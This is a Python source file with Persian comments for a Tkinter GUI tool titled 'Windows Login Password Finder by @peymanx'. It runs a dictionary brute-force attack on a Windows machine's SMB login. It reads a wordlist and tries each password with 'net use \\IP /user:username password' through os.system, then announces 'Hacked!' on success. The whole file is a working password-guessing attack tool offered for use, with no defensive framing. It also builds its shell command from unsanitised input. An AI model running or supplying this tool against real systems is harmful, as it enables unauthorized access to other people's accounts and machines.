import os
import shutil
import tkinter as tk
from tkinter import filedialog, messagebox
from tkinter.ttk import Progressbar
from PIL import Image, ImageTk

# تابع برای نمایش باکس
def print_box(message):
    messagebox.showinfo("Info", message)

# تابع برای امتحان کردن پسوردها
def brute_force_attack(ip_address, username, passwords):
    password_found = False
    progress_bar['maximum'] = len(passwords)

    for i, password in enumerate(passwords):
        password = password.strip()  # حذف کاراکترهای اضافی مانند \n
        status_label.config(text=f'{" "*10}{password}{" "*10}')
        root.update_idletasks()
        command = f'net use \\\\{ip_address} /user:{username} {password} >nul 2>&1'
        result = os.system(command)

        if result == 0:  # اگر اتصال موفقیت‌آمیز بود
            print_box(f'Password found: {password}')
            messagebox.showinfo("Hacked!", f'Password: {password}')
            password_found = True
            break

        # به‌روزرسانی نوار پیشرفت
        progress_bar['value'] = i + 1
        root.update_idletasks()

    if not password_found:
        print_box('Password not found!')
        messagebox.showinfo("Failure", 'Password not found!')

# ایجاد واسط گرافیکی با استفاده از Tkinter
root = tk.Tk()
root.title("Windows Login Password Finder by @peymanx")
root.configure(bg='black')

# تنظیمات برای وسط‌چین کردن محتوا
root.grid_rowconfigure(0, weight=1)
root.grid_columnconfigure(0, weight=1)

# ایجاد فریم اصلی
main_frame = tk.Frame(root, bg='black')
main_frame.grid(row=0, column=0, sticky="nsew")

# بارگذاری و نمایش بنر
banner_image = Image.open("./images/login_banner.png")  # مسیر تصویر بنر
banner_photo = ImageTk.PhotoImage(banner_image)
banner_label = tk.Label(main_frame, image=banner_photo, bg='black')
banner_label.grid(row=0, column=0, columnspan=3, pady=10)

# برچسب و ورودی برای آدرس IP
tk.Label(main_frame, text="IP Address:", bg='black', fg='white').grid(row=1, column=0, padx=10, pady=10)
ip_entry = tk.Entry(main_frame, width=50, bg='black', fg='white')
ip_entry.grid(row=1, column=1, padx=10, pady=10)
ip_entry.insert(0, "127.0.0.1")  # مقدار پیش‌فرض

# برچسب و ورودی برای نام کاربری
tk.Label(main_frame, text="Username:", bg='black', fg='white').grid(row=2, column=0, padx=10, pady=10)
username_entry = tk.Entry(main_frame, width=50, bg='black', fg='white')
username_entry.grid(row=2, column=1, padx=10, pady=10)
username_entry.insert(0, "alireza")  # مقدار پیش‌فرض

# برچسب و ورودی برای مسیر فایل پسوردها
tk.Label(main_frame, text="Password File Path:", bg='black', fg='white').grid(row=3, column=0, padx=10, pady=10)
password_entry = tk.Entry(main_frame, width=50, bg='black', fg='white')
password_entry.grid(row=3, column=1, padx=10, pady=10)
password_entry.insert(0, "../passwords.txt")  # مقدار پیش‌فرض
tk.Button(main_frame, text="Browse", command=lambda: password_entry.insert(0, filedialog.askopenfilename()), bg='white', fg='black').grid(row=3, column=2, padx=10, pady=10)

# نوار پیشرفت
progress_bar = Progressbar(main_frame, orient='horizontal', length=400, mode='determinate')
progress_bar.grid(row=4, column=0, columnspan=3, pady=10)

# برچسب وضعیت
status_label = tk.Label(main_frame, text="", bg='black', fg='white')
status_label.grid(row=5, column=0, columnspan=3)

# دکمه برای شروع فرآیند پیدا کردن پسورد
tk.Button(main_frame, text="    شروع حمله بروووت فورس 🔑", command=lambda: brute_force_attack(ip_entry.get(), username_entry.get(), open(password_entry.get()).readlines()), bg='gold', fg='black', font=("Helvetica", 12)).grid(row=6, column=0, columnspan=3, pady=20)

root.mainloop()